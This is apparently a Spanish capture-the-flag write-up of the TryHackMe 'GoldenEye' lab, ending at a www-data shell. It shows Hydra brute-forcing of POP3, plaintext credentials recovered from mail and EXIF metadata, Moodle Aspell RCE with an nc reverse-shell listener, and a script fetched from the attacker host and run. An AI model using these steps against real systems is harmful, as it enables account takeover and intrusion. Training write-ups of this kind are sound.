---
title: "TryHackMe: GoldenEye"
date: 2024-12-15
category: "TryHackMe"
order: 14
tags: ["tryhackme", "moodle", "pop3", "osint", "unsolved"]
layout: layouts/writeup.njk
permalink: /writeups/thm-goldeneye.html
---

> Nota: esta nota termina justo después de obtener RCE como `www-data` y correr el chequeo de privilege escalation — no llegué a completar el camino hasta root en esta sesión. Lo dejo tal cual, ya que la parte de reconocimiento y encadenamiento de credenciales vía correo es la parte más interesante e instructiva.

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.81.236
...
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d
```

**4 puertos abiertos.**

### Contraseña codificada en el sitio web

Revisando el código fuente del sitio se encuentra la contraseña de "Boris" codificada — resulta ser **Setec Astronomy** de la película GoldenEye, codificada con un cifrado simple reconocible a simple vista (rotación de caracteres tipo ROT). Decodificándola:

**Usuario:** `boris` — **Contraseña:** `InvincibleHack3r`

### Login en `/sev-home/`

Con esas credenciales se accede a una sección del sitio, donde se revela que hay un servicio POP3 corriendo en un puerto no estándar — coincide con el puerto **55007** encontrado en el nmap. El código fuente también revela quiénes son los "qualified GNO supervisors" a contactar por correo.

---

## Cadena de correos vía POP3

Las credenciales de Boris no funcionan directamente contra POP3. Con Hydra se encuentra la contraseña real:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.81.236 pop3
[55007][pop3] host: 10.10.81.236   login: boris   password: secret1!
```

Conectando por telnet al puerto 55007 y usando comandos POP3 (`USER`, `PASS`, `LIST`, `RETR`):

```
telnet 10.10.81.236 55007
USER boris
PASS secret1!
LIST
RETR 1
RETR 2
RETR 3
```

Los correos de Boris revelan dos usuarios nuevos: **natalya** (quien puede "romper los códigos de Boris") y **alec** (mensaje sobre códigos de acceso de GoldenEye, contexto de la trama de la película).

### natalya

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.81.236 pop3
[55007][pop3] host: 10.10.81.236   login: natalya   password: bird
```

Sus correos revelan credenciales para un nuevo usuario **xenia** (`xenia` / `RCP90rulez!`) y la URL del dominio interno: `severnaya-station.com/gnocertdir` (agregado a `/etc/hosts`).

### xenia → doak → dr_doak

En la plataforma Moodle (`severnaya-station.com/gnocertdir`) se loguea como `xenia`, y explorando el sitio aparece otro usuario: **doak**.

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.81.236 pop3
[55007][pop3] host: 10.10.81.236   login: doak   password: goat
```

El correo de doak revela credenciales para **dr_doak** (`dr_doak` / `4England!`) directamente en el cuerpo del mensaje — sin necesidad de más fuerza bruta.

### Metadatos EXIF con la contraseña de admin

En los archivos adjuntos de dr_doak en Moodle hay un archivo de texto con una pista:

```
007,
I was able to capture this apps adm1n cr3ds through clear txt.
Something juicy is located here: /dir007key/for-007.jpg
```

Descargando la imagen y analizando sus metadatos con `exiftool`:

```bash
curl -O http://10.10.81.236/dir007key/for-007.jpg
exiftool for-007.jpg

Image Description : eFdpbnRlcjE5OTV4IQ==
Artist             : For James
```

`eFdpbnRlcjE5OTV4IQ==` decodificado de Base64 (con CyberChef) da la contraseña: **`xWinter1995x!`**. El correo de doak ya había identificado a este usuario como el admin de Moodle.

---

## RCE vía plugin Aspell de Moodle

Con acceso de administrador en Moodle, se puede editar la configuración del sitio. El plugin de spell-checker (**Aspell**) permite ejecutar comandos del sistema al configurarlo con un path controlado por el atacante — un patrón conocido de RCE en Moodle vía configuración de herramientas externas.

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Al disparar el spell-check desde el editor, se recibe la conexión:

```
listening on [any] 4444 ...
connect to [10.13.51.230] from (UNKNOWN) [10.10.81.236] 52108
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
```

Shell interactiva obtenida como `www-data` dentro del árbol de Moodle.

---

## Enumeración de privilege escalation

Se transfiere `linuxprivchecker.py` a la máquina objetivo sirviéndolo con un servidor HTTP simple:

```bash
# Atacante
python3 -m http.server

# Objetivo
wget http://10.13.51.230:8000/linuxprivchecker.py
python linuxprivchecker.py
```

Hallazgos relevantes del reporte:

- **Kernel:** `3.13.0-32-generic` (Ubuntu, 2014) — bastante antiguo, candidato a exploits de kernel.
- **Usuario actual:** `www-data` (uid=33), sin privilegios especiales.
- Varios directorios de Moodle (`moodledata/*`) son **world-writable** por `www-data`.
- El script sugiere varios exploits de escalada de privilegios aplicables a la versión de kernel detectada (CAP_SYS_ADMIN to root, ia32syscall emulation, entre otros).
- Hay un servicio **PostgreSQL** corriendo localmente en el puerto 5432 — vector clásico en esta máquina para escalar a root vía funciones definidas por el usuario (UDF), aunque no llegué a explotarlo en esta sesión.

**Pregunta del room:** ¿cuál es la versión del kernel? → `3.13.0-32-generic`

---

## Lecciones aprendidas

- Cadenas de credenciales por correo (POP3) son un patrón muy común en máquinas CTF de estilo "boot2root" — cada usuario comprometido revela pistas para el siguiente.
- Los metadatos EXIF de una imagen (`exiftool`) pueden esconder credenciales en campos poco obvios como `Image Description`.
- Un CMS como Moodle con acceso de administrador casi siempre tiene alguna ruta hacia RCE a través de plugins que invocan binarios del sistema (en este caso, el corrector ortográfico).
- `linuxprivchecker.py` es útil para tener una vista rápida de vectores de privesc, pero no reemplaza la explotación manual dirigida (en este caso, PostgreSQL local quedó como pista sin explotar).
